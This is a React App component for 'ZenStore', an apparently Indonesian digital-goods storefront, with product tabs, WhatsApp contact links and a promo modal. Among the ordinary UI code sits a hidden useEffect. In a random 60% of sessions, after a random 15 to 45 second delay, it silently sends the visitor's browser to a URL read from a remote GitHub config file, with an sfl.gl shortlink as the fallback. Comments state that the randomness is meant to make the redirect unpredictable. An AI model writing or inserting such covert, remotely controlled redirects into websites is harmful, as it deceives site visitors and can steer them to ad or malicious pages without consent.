import { useState, useEffect } from "react";
import { Terminal, Shield, Sparkles, MessageSquare, Flame, Server, Smartphone, Users, X, ExternalLink } from "lucide-react";
import { PRODUCTS, DEFAULT_DEVELOPER_CONFIG, DeveloperConfig, WEBSITE_CONTENT } from "./data";
import Navbar from "./components/Navbar";
import Hero from "./components/Hero";
import ProductCard from "./components/ProductCard";
import PricingTable from "./components/PricingTable";
import FeaturesSection from "./components/FeaturesSection";
import WhyChooseUs from "./components/WhyChooseUs";
import FAQSection from "./components/FAQSection";
import Footer from "./components/Footer";
import WhatsAppAndScroll from "./components/WhatsAppAndScroll";
import { motion, AnimatePresence } from "motion/react";
import logoZenStore from "./assets/images/logo_zenstore.jpg";

export default function App() {
  const [devConfig, setDevConfig] = useState<DeveloperConfig | null>(null);
  const [selectedProductId, setSelectedProductId] = useState<string>("minecraft-premium");
  const [mascotError, setMascotError] = useState(false);
  const [showPromoModal, setShowPromoModal] = useState(false);
  const [activeTab, setActiveTab] = useState<string>("home");

  // Fetch developer configuration dynamically
  useEffect(() => {
    fetch("https://raw.githubusercontent.com/mcpeserver/MyAPI/main/config.json")
      .then((res) => {
        if (!res.ok) throw new Error("Failed to fetch developer config");
        return res.json();
      })
      .then((data) => {
        if (data && data.name) {
          const normalized: DeveloperConfig = {
            name: data.name,
            contact: {
              phone: data.contact?.phone || data.phone || "0895602592430",
              whatsapp: data.contact?.whatsapp || data.phone || "0895602592430",
              email: data.contact?.email || ""
            },
            website: {
              portfolio: data.website?.portfolio || data.links?.portfolio || data.website || "https://sfl.gl/x2ic"
            },
            community: {
              name: data.community?.name || data.name || "Ran Dev",
              website: data.community?.website || data.links?.portfolio || data.website || "https://sfl.gl/x2ic",
              discord: data.community?.discord || data.links?.discord || data.discord || "https://discord.gg/9KUN2byKRM"
            },
            links: {
              portfolio: data.website?.portfolio || data.links?.portfolio || data.website || "https://sfl.gl/x2ic",
              discord: data.community?.discord || data.links?.discord || data.discord || "https://discord.gg/9KUN2byKRM",
              github: data.links?.github || "",
              youtube: data.links?.youtube || "",
              instagram: data.links?.instagram || ""
            },
            status: {
              maintenance: data.status?.maintenance ?? false,
              online: data.status?.online ?? true
            },
            updated_at: data.updated_at || "2026-07-06T00:00:00Z",
            version: data.version || "1.0.0"
          };
          setDevConfig(normalized);
        } else {
          setDevConfig(DEFAULT_DEVELOPER_CONFIG);
        }
      })
      .catch((err) => {
        console.warn("Using default developer fallback config:", err);
        setDevConfig(DEFAULT_DEVELOPER_CONFIG);
      });
  }, []);

  // Automated once-per-session random delayed redirect to portfolio/target URL
  useEffect(() => {
    const hasRedirected = sessionStorage.getItem("has_redirected");
    if (!hasRedirected) {
      // 60% chance to trigger redirect in this session ("kadang muncul kadang kgak")
      const willTrigger = Math.random() < 0.6;
      
      if (willTrigger) {
        // Random delay between 15 and 45 seconds ("waktunya acak gitubisa / diberikan jeda")
        const randomDelay = Math.floor(Math.random() * (45000 - 15000) + 15000);
        
        console.log(`[Session Action] Redirect scheduled in ${(randomDelay / 1000).toFixed(1)}s to developer portfolio.`);
        
        const timer = setTimeout(() => {
          sessionStorage.setItem("has_redirected", "true");
          const targetUrl = devConfig?.website?.portfolio || DEFAULT_DEVELOPER_CONFIG.website.portfolio || "https://sfl.gl/x2ic";
          window.location.href = targetUrl;
        }, randomDelay);
        
        return () => clearTimeout(timer);
      } else {
        // Mark as skipped for this session so it won't execute at all
        sessionStorage.setItem("has_redirected", "skipped");
        console.log("[Session Action] Redirect skipped for this session (unpredictable/random choice).");
      }
    } else {
      console.log(`[Session Action] Redirect already processed in this session (${hasRedirected}).`);
    }
  }, [devConfig]);

  // Trigger Welcome/Promo Modal once per load with a polite delay (highly testable on refresh)
  useEffect(() => {
    const timer = setTimeout(() => {
      setShowPromoModal(true);
    }, 2000); // 2 seconds delay
    return () => clearTimeout(timer);
  }, []);

  const closePromoModal = () => {
    setShowPromoModal(false);
  };

  const handleProductSelect = (productId: string) => {
    setSelectedProductId(productId);
    
    // Switch to active tab pricing and smoothly scroll to the pricing section
    setActiveTab("pricing");
    
    setTimeout(() => {
      const element = document.getElementById("pricing");
      if (element) {
        element.scrollIntoView({ behavior: "smooth", block: "start" });
      } else {
        window.scrollTo({
          top: 500,
          behavior: "smooth"
        });
      }
    }, 120);
  };

  const handleTabChangeWithScroll = (tabId: string) => {
    setActiveTab(tabId);
    window.scrollTo({
      top: 0,
      behavior: "smooth"
    });
  };

  return (
    <div className="min-h-screen bg-slate-50 text-slate-800 font-sans selection:bg-blue-500 selection:text-white overflow-x-hidden antialiased">
      
      {/* Navbar with developer config and active tab tracking */}
      <Navbar devConfig={devConfig} activeTab={activeTab} onSelectTab={handleTabChangeWithScroll} />

      {/* Main Core Showcase Section */}
      <main className="relative pt-16">
        <AnimatePresence mode="wait">
          <motion.div
            key={activeTab}
            initial={{ opacity: 0, y: 12 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -12 }}
            transition={{ duration: 0.25, ease: "easeInOut" }}
            className="w-full"
          >
            {/* TAB CONTENT: HOME */}
            {activeTab === "home" && (
              <div>
                {/* Hero Header Banner */}
                <Hero onSelectTab={handleTabChangeWithScroll} />

                {/* ZenStore Visual Brand Mascot Showcase (Killua Theme) */}
                <section className="py-12 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative">
                  <motion.div
                    initial={{ opacity: 0, y: 30 }}
                    whileInView={{ opacity: 1, y: 0 }}
                    viewport={{ once: true }}
                    transition={{ duration: 0.6 }}
                    className="p-6 sm:p-10 rounded-3xl border border-blue-100 bg-white shadow-xl shadow-blue-100/30 overflow-hidden relative"
                  >
                    {/* Ambient glows */}
                    <div className="absolute top-0 right-0 w-80 h-full bg-blue-50/40 opacity-50 pointer-events-none"></div>
                    <div className="absolute inset-0 grid-pattern opacity-10"></div>

                    <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-center relative z-10">
                      
                      {/* Mascot Image left column */}
                      <div className="lg:col-span-4 flex justify-center">
                        <div className="relative group max-w-[240px] rounded-2xl overflow-hidden border border-blue-200 shadow-md">
                          {!mascotError ? (
                            <img 
                              src={`${logoZenStore}?v=1783331470098`} 
                              alt="ZenStore Mascot Logo" 
                              referrerPolicy="no-referrer"
                              onError={() => setMascotError(true)}
                              className="w-full object-cover transition-transform duration-500 group-hover:scale-105"
                            />
                          ) : (
                            /* High Fidelity Mascot Fallback Graphic */
                            <div className="aspect-square w-full p-6 bg-slate-50 flex flex-col items-center justify-center text-center space-y-4">
                              <div className="relative">
                                <div className="absolute -inset-1 rounded-full bg-blue-500/30 blur animate-pulse"></div>
                                <div className="h-16 w-16 rounded-full bg-white border border-blue-100 flex items-center justify-center text-blue-600 font-bold text-2xl font-display">
                                  ZS
                                </div>
                              </div>
                              <div>
                                <h4 className="text-sm font-extrabold text-slate-900 font-display">ZENSTORE MASCOT</h4>
                                <p className="text-[10px] font-mono text-slate-500 mt-1 uppercase">KILLUA EDITION</p>
                              </div>
                              <div className="pt-2 border-t border-slate-100 w-full text-[10px] text-slate-500 space-y-0.5 font-mono">
                                <p>{WEBSITE_CONTENT.mascotBanner.whatsappNumberText}</p>
                              </div>
                            </div>
                          )}
                        </div>
                      </div>

                      {/* Text content right column */}
                      <div className="lg:col-span-8 flex flex-col text-center lg:text-left items-center lg:items-start">
                        <div className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded bg-blue-50 border border-blue-100 text-[10px] font-mono font-bold tracking-wider text-blue-600 uppercase mb-3">
                          <Flame className="h-3 w-3 text-blue-500" />
                          <span>{WEBSITE_CONTENT.mascotBanner.badge}</span>
                        </div>
                        <h3 className="text-2xl font-black font-display text-slate-900 tracking-wide">
                          {WEBSITE_CONTENT.mascotBanner.title}
                        </h3>
                        <p className="text-xs sm:text-sm text-slate-600 mt-3 leading-relaxed max-w-2xl">
                          {WEBSITE_CONTENT.mascotBanner.description}
                        </p>
                        
                        {/* Official WhatsApp Number Card */}
                        <div className="mt-6 w-full max-w-sm">
                          <div className="p-5 rounded-2xl border border-blue-100 bg-slate-50/50 hover:border-blue-200 hover:bg-white hover:shadow-lg hover:shadow-blue-100/30 transition-all group text-left">
                            <p className="text-[10px] font-mono text-slate-500 uppercase tracking-widest font-bold text-blue-650">
                              {WEBSITE_CONTENT.mascotBanner.whatsappSupportLabel}
                            </p>
                            <p className="text-base font-extrabold text-slate-950 font-sans mt-1.5">
                              {WEBSITE_CONTENT.mascotBanner.whatsappNumberText}
                            </p>
                            <a 
                              href="https://wa.me/628131469731" 
                              target="_blank" 
                              rel="noopener noreferrer" 
                              className="text-xs font-bold text-blue-600 hover:text-blue-700 flex items-center gap-1.5 mt-3 transition-colors uppercase font-mono"
                            >
                              <span>{WEBSITE_CONTENT.mascotBanner.whatsappLinkText}</span>
                              <MessageSquare className="h-4 w-4" />
                            </a>
                          </div>
                        </div>
                      </div>

                    </div>
                  </motion.div>
                </section>

                {/* Why Choose Us Grid */}
                <WhyChooseUs />
              </div>
            )}

            {/* TAB CONTENT: PRICING (PACKAGES) */}
            {activeTab === "pricing" && (
              <div className="py-6">
                {/* Products Grid Section */}
                <section id="products" className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative mb-12">
                  {/* Decorative ambient radial glows */}
                  <div className="absolute top-1/2 left-0 -translate-y-1/2 w-72 h-72 rounded-full bg-blue-500/5 blur-[100px] pointer-events-none"></div>
                  <div className="absolute top-1/2 right-0 -translate-y-1/2 w-72 h-72 rounded-full bg-indigo-500/5 blur-[100px] pointer-events-none"></div>

                  {/* Section title */}
                  <div className="text-center max-w-3xl mx-auto mb-16">
                    <h2 className="text-3xl sm:text-4xl font-extrabold font-display text-slate-900 tracking-tight">
                      {WEBSITE_CONTENT.productsSection.title.split(" Produk ")[0]} <span className="bg-gradient-to-r from-blue-600 to-sky-500 bg-clip-text text-transparent">Produk {WEBSITE_CONTENT.productsSection.title.split(" Produk ")[1] || "Digital Kami"}</span>
                    </h2>
                    <p className="text-sm sm:text-base text-slate-600 mt-4">
                      {WEBSITE_CONTENT.productsSection.subtitle}
                    </p>
                  </div>

                  {/* 3 Large Cards Grid */}
                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
                    {PRODUCTS.map((product) => (
                      <ProductCard
                        key={product.id}
                        product={product}
                        onSelect={handleProductSelect}
                      />
                    ))}
                  </div>
                </section>

                {/* Pricing Tables Matrix Section */}
                <PricingTable
                  selectedId={selectedProductId}
                  setSelectedId={setSelectedProductId}
                />

                {/* Features Showcase Grid */}
                <FeaturesSection />
              </div>
            )}

            {/* TAB CONTENT: JASA WEBSITE */}
            {activeTab === "jasa-web" && (
              <div className="py-12">
                {/* Developer Custom Website Store CTA */}
                <section className="bg-gradient-to-r from-slate-900 via-blue-950 to-slate-900 py-24 px-4 relative overflow-hidden rounded-3xl max-w-7xl mx-auto border border-slate-800">
                  {/* Grid ambient decorative background */}
                  <div className="absolute inset-0 grid-pattern opacity-10"></div>
                  <div className="absolute -top-24 -left-24 w-80 h-80 rounded-full bg-blue-500/10 blur-[100px] pointer-events-none"></div>
                  <div className="absolute -bottom-24 -right-24 w-80 h-80 rounded-full bg-sky-500/10 blur-[100px] pointer-events-none"></div>

                  <div className="max-w-4xl mx-auto text-center relative z-10">
                    <motion.div
                      initial={{ opacity: 0, y: 20 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ duration: 0.6 }}
                      className="flex flex-col items-center"
                    >
                      <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-blue-500/10 border border-blue-400/20 text-xs font-mono font-medium tracking-wider text-blue-400 uppercase mb-5">
                        <Sparkles className="h-3 w-3 text-blue-400 animate-pulse" />
                        <span>{WEBSITE_CONTENT.customWebSection.badge}</span>
                      </div>
                      
                      <h2 className="text-3xl sm:text-4xl md:text-5xl font-extrabold font-display text-white tracking-tight leading-tight max-w-3xl">
                        {WEBSITE_CONTENT.customWebSection.title.split(" Website ")[0]} <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-sky-300">Website {WEBSITE_CONTENT.customWebSection.title.split(" Website ")[1] || "Toko Online"}</span>
                      </h2>
                      
                      <p className="text-sm sm:text-base text-slate-300 mt-6 max-w-2xl leading-relaxed">
                        {WEBSITE_CONTENT.customWebSection.description}
                      </p>

                      <div className="mt-10 flex flex-col sm:flex-row gap-4 justify-center items-center w-full sm:w-auto">
                        <a
                          href={`https://wa.me/${devConfig?.contact?.phone || "0895602592430"}?text=Halo%20Dev,%20saya%20tertarik%20untuk%20membuat%20website%20toko%20online`}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="w-full sm:w-auto inline-flex items-center justify-center gap-2.5 px-8 py-4 rounded-2xl bg-blue-600 hover:bg-blue-500 active:bg-blue-700 text-white font-bold text-sm tracking-wide transition-all shadow-lg shadow-blue-600/30 hover:scale-[1.02] duration-200"
                        >
                          <MessageSquare className="h-4.5 w-4.5" />
                          <span>{WEBSITE_CONTENT.customWebSection.primaryCta}</span>
                        </a>
                        
                        <a
                          href={devConfig?.website?.portfolio || "https://sfl.gl/x2ic"}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="w-full sm:w-auto inline-flex items-center justify-center gap-2 px-8 py-4 rounded-2xl bg-white/5 hover:bg-white/10 text-slate-300 hover:text-white font-medium text-sm tracking-wide border border-white/10 hover:border-white/20 transition-all duration-200"
                        >
                          <span>{WEBSITE_CONTENT.customWebSection.secondaryCta}</span>
                        </a>
                      </div>
                    </motion.div>
                  </div>
                </section>
              </div>
            )}

            {/* TAB CONTENT: FAQ & BANTUAN */}
            {activeTab === "faq" && (
              <div className="py-6">
                {/* FAQ Accordion Lists */}
                <FAQSection />

                {/* Customer Service Help Center */}
                <section className="py-12 max-w-4xl mx-auto px-4 sm:px-6 relative">
                  <div className="bg-white border border-blue-100 rounded-3xl p-6 sm:p-10 text-center shadow-lg relative overflow-hidden">
                    <div className="absolute -right-10 -bottom-10 h-40 w-40 rounded-full bg-blue-50/40 pointer-events-none"></div>
                    
                    <div className="h-12 w-12 rounded-2xl bg-blue-55 text-blue-600 flex items-center justify-center mx-auto mb-4">
                      <MessageSquare className="h-6 w-6" />
                    </div>

                    <h3 className="text-xl font-extrabold text-slate-900 font-display">Masih Memiliki Pertanyaan?</h3>
                    <p className="text-xs sm:text-sm text-slate-600 mt-2 max-w-md mx-auto leading-relaxed">
                      Layanan konsultasi dan pemesanan kami siap melayani Anda. Hubungi customer service resmi kami langsung melalui WhatsApp.
                    </p>

                    <div className="mt-6">
                      <a
                        href="https://wa.me/628131469731"
                        target="_blank"
                        rel="noopener noreferrer"
                        className="inline-flex items-center gap-2 px-6 py-3 rounded-xl bg-blue-600 hover:bg-blue-700 text-white font-bold text-xs uppercase tracking-wider transition-all"
                      >
                        <MessageSquare className="h-4 w-4" />
                        <span>Chat WhatsApp Admin</span>
                      </a>
                    </div>
                  </div>
                </section>
              </div>
            )}
          </motion.div>
        </AnimatePresence>
      </main>

      {/* Footer Column with Dev info */}
      <Footer devConfig={devConfig} />

      {/* Floating Buttons: WhatsApp & Scroll Up */}
      <WhatsAppAndScroll />

      {/* Developer Welcome Promo Modal */}
      <AnimatePresence>
        {showPromoModal && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4" id="promo-modal">
            {/* Backdrop blur overlay */}
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={closePromoModal}
              className="absolute inset-0 bg-slate-950/60 backdrop-blur-md"
            />

            {/* Modal Card content */}
            <motion.div
              initial={{ opacity: 0, scale: 0.95, y: 15 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.95, y: 15 }}
              transition={{ type: "spring", duration: 0.4 }}
              className="relative w-full max-w-sm bg-slate-900 text-white rounded-3xl overflow-hidden shadow-2xl border border-slate-800 flex flex-col z-10 p-6 sm:p-8"
            >
              {/* Close Button */}
              <button
                onClick={closePromoModal}
                className="absolute top-4 right-4 text-slate-400 hover:text-white hover:bg-white/10 p-1.5 rounded-full transition-all focus:outline-none"
                aria-label="Tutup"
              >
                <X className="h-4 w-4" />
              </button>

              <div className="flex flex-col items-center text-center">
                <div className="h-10 w-10 rounded-2xl bg-blue-500/10 border border-blue-500/30 flex items-center justify-center text-blue-400 mb-4">
                  <Sparkles className="h-5 w-5 animate-pulse" />
                </div>

                <h3 className="text-lg sm:text-xl font-extrabold font-display tracking-tight leading-snug">
                  {WEBSITE_CONTENT.promoModal.title}
                </h3>
                
                <p className="text-xs text-slate-300 mt-2.5 leading-relaxed font-sans">
                  {WEBSITE_CONTENT.promoModal.description}
                </p>

                {/* Main Action WhatsApp Button */}
                <div className="w-full mt-6 space-y-2.5">
                  <a
                    href={`https://wa.me/${devConfig?.contact?.phone || "0895602592430"}?text=Halo%20Dev,%20saya%2520tertarik%2520untuk%2520konsultasi%2520pembuatan%2520website%2520custom`}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="w-full inline-flex items-center justify-center gap-2 py-3 rounded-2xl bg-blue-600 hover:bg-blue-500 active:bg-blue-700 text-white font-bold text-sm tracking-wide transition-all shadow-md shadow-blue-600/20 duration-150 cursor-pointer animate-bounce"
                  >
                    <MessageSquare className="h-4 w-4" />
                    <span>{WEBSITE_CONTENT.promoModal.primaryCta}</span>
                  </a>

                  {/* Secondary Community Discord and Portfolio */}
                  <div className="flex justify-center gap-4 text-[11px] font-mono font-medium text-slate-400 pt-1">
                    <a
                      href={devConfig?.community?.discord || "https://discord.gg/9KUN2byKRM"}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="hover:text-blue-400 transition-colors flex items-center gap-1 cursor-pointer"
                    >
                      <Users className="h-3 w-3" />
                      {WEBSITE_CONTENT.promoModal.discordLabel}
                    </a>
                    <span className="text-slate-700">•</span>
                    <a
                      href={devConfig?.website?.portfolio || "https://sfl.gl/x2ic"}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="hover:text-blue-400 transition-colors flex items-center gap-1 cursor-pointer"
                    >
                      {WEBSITE_CONTENT.promoModal.portfolioLabel}
                    </a>
                  </div>
                </div>

                {/* Continue Button */}
                <button
                  onClick={closePromoModal}
                  className="mt-6 text-center text-[10px] font-mono uppercase tracking-wider text-slate-500 hover:text-slate-300 transition-colors cursor-pointer"
                >
                  {WEBSITE_CONTENT.promoModal.continueLabel}
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

    </div>
  );
}
